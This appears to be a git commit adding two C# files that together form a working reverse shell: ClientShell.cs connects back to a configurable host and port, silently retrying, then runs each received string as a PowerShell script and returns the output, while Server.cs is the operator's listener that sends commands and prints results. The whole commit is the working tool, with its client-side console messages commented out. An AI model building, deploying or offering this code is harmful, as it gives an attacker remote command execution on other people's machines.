fb6feecb1af5968facb5ed571792d8079f96cb21
MarcelloCarboni <marcicarboni00@gmail.com>
2023-02-02 01:19:57 +0100

    Uploaded files

---
+++ ClientShell.cs
@@ -0,0 +1,96 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net.Sockets;
+using System.Net;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Collections.ObjectModel;
+using System.IO;
+
+namespace ClientSocket
+{
+    internal class ClientShell
+    {
+
+        public string GetResult(string cmd)
+        {
+            string result = null;
+
+            RunspaceConfiguration rc = RunspaceConfiguration.Create();
+            Runspace r = RunspaceFactory.CreateRunspace( rc );
+            r.Open();
+
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = r;
+            ps.AddScript( cmd );
+
+            StringWriter sw = new StringWriter();
+
+            Collection<PSObject> po = ps.Invoke();
+            foreach ( PSObject p in po ) 
+            {
+                sw.WriteLine( p.ToString() );
+            }
+            result= sw.ToString();
+            if (result == "")
+                return "Command not recognized";
+            else
+                return result;
+        }
+        static void Main(string[] args)
+        {
+            // CHANGE THIS
+            string IP_ADDRESS = "127.0.0.1";
+            int PORT = 1234;
+
+            ClientShell program = new ClientShell();
+
+            int BUFFER_SIZE = 2 * 1024;
+            IPAddress serverIP = IPAddress.Parse(IP_ADDRESS);
+            IPEndPoint ipe = new IPEndPoint(serverIP, PORT);
+
+            Socket cs = new Socket(serverIP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+
+            int failedAttempts = 0;
+            do
+            {
+                try
+                {
+                    cs.Connect(ipe);
+                }
+                catch (Exception ex)
+                {
+                    failedAttempts++;
+                    //Console.WriteLine("Failed to connect. {0}", failedAttempts);
+
+                    System.Threading.Thread.Sleep(30 * 1000);
+                }
+            } while (failedAttempts < 5 && !cs.Connected);
+
+            if (!cs.Connected)
+                Environment.Exit(1);
+
+
+            string msg, result;
+            byte[] buffer = new byte[BUFFER_SIZE];
+
+            do
+            {
+                Array.Clear(buffer, 0, BUFFER_SIZE);
+                cs.Receive(buffer);
+                msg = Encoding.ASCII.GetString(buffer).TrimEnd('\0');
+                //Console.WriteLine("[+] Server says: {0}", msg);
+
+                result = program.GetResult(msg);
+
+                cs.Send(Encoding.ASCII.GetBytes(result));
+            } while (msg != "quit");
+
+
+            cs.Close();
+        }
+    }
+}
---
+++ Server.cs
@@ -0,0 +1,49 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net.Sockets;
+using System.Net;
+
+namespace Server
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            int PORT = 1234;
+            int BUFFER_SIZE = 2 * 1024;
+            // CHANGE THIS
+            IPEndPoint ipe = new IPEndPoint(IPAddress.Any, PORT);
+
+            Socket serverSocket = new Socket(IPAddress.Any.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+            serverSocket.Bind(ipe);
+            serverSocket.Listen(5);
+
+            Console.WriteLine("Server listening on port {0}", PORT);
+
+            Socket clientSocket = serverSocket.Accept();
+
+            Console.WriteLine("[+] New connection from {0}", clientSocket.LocalEndPoint);
+
+            string msg;
+            byte[] buffer = new byte[BUFFER_SIZE];
+            do
+            {
+                Console.Write("$: ");
+                msg = Console.ReadLine();
+
+                clientSocket.Send(Encoding.ASCII.GetBytes(msg));
+
+                Array.Clear(buffer, 0, BUFFER_SIZE);
+                clientSocket.Receive(buffer);
+
+                Console.WriteLine("{0}", Encoding.ASCII.GetString(buffer).TrimEnd('\0'));
+            } while (msg != "quit");
+
+            clientSocket.Close();
+            serverSocket.Close();
+        }
+    }
+}
